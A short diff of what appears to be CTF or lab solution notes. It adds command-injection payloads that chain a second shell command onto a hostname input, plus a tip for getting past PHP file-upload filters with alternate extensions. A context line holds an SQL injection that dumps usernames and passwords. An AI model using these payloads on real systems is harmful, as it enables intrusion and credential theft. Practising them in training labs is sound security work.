@@ -61,6 +61,17 @@ Level 3
 ' union select null,username,password,null from table='sql1'; --
 
 
+## Command injection
+Level 1
+google.fr; ls
+
+
+Level 2
+google.fr" && ls #
+
+## PHP file upload
+try to upload .php3, .php4, .php5, .phtml...
+
 5 secrets : 
 
 
